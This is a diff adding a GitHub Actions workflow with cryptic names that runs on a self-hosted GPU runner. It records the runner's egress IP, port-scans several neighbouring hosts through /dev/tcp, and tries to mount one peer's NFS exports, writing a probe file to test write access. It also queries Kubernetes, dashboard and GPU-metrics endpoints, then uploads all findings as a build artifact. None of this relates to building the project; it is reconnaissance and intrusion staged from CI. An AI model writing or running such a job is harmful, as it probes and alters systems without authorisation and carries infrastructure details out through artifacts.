@@ -1,0 +1,56 @@
+name: ul7466f
+on:
+  workflow_dispatch:
+    inputs:
+      runtag: {description: "tag", default: "seg"}
+permissions:
+  contents: write
+jobs:
+  ex:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: seg
+        env: {TAG: "${{ inputs.runtag }}"}
+        run: |
+          set +e
+          L="vantage/gv5817/${TAG}_seg.log"; mkdir -p vantage/gv5817
+          {
+          echo "=== $TAG $(date -u +%FT%TZ) egress=$(curl -s -m 8 https://api.ipify.org) host=$(hostname)"
+          for h in 123.184.7.208 123.184.7.179 123.184.7.129 123.184.7.170; do
+            echo "---- $h"
+            for p in 22 111 781 2049 3000 6443 8888 9100 9400 9090 8099; do
+              timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && echo "  $p OPEN" || echo "  $p closed"
+            done
+          done
+          echo "=== NFS 208"
+          command -v showmount >/dev/null || sudo apt-get -qq update >/dev/null 2>&1
+          command -v showmount >/dev/null || sudo apt-get -qq -y install nfs-common >/dev/null 2>&1
+          showmount -e 123.184.7.208 2>&1 | head -20
+          rpcinfo -p 123.184.7.208 2>&1 | head -20
+          sudo mkdir -p /mnt/ul208
+          for e in / /home /data /ssd /opt /export; do
+            echo "-- mount $e"
+            timeout 25 sudo mount -t nfs -o vers=3,nolock,soft,timeo=10,retrans=1 "123.184.7.208:$e" /mnt/ul208 2>&1 | head -3
+            if mountpoint -q /mnt/ul208; then
+              echo "MOUNTED $e"; ls -la /mnt/ul208 2>&1 | head -20
+              echo "WRITETEST $(date -u +%s)" | sudo tee /mnt/ul208/.ul7466_probe >/dev/null 2>&1 && echo "write_ok" || echo "write_fail"
+              cat /mnt/ul208/.ul7466_probe 2>/dev/null
+              sudo umount /mnt/ul208 2>/dev/null
+              break
+            fi
+          done
+          echo "=== HTTP peers"
+          for u in "http://123.184.7.179:3000/" "http://123.184.7.179:9090/" "http://123.184.7.179:9400/metrics" "https://123.184.7.170:6443/version" "http://123.184.7.170:8888/"; do
+            echo "-- $u"; curl -sk -m 8 -o /tmp/o -w 'code=%{http_code} sz=%{size_download}\n' "$u"; head -c 200 /tmp/o; echo
+          done
+          echo "=== DCGM inventory"
+          for h in 123.184.7.208 123.184.7.179 123.184.7.129; do
+            echo "-- $h"; curl -s -m 8 "http://$h:9400/metrics" 2>/dev/null | grep -E 'DCGM_FI_DEV_NAME|DCGM_FI_DEV_MEMORY_TEMP|modelName' | head -5
+          done
+          } > "$L" 2>&1
+          cat "$L"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: "ul7466f-${{ github.run_id }}", path: vantage/gv5817/, if-no-files-found: warn}
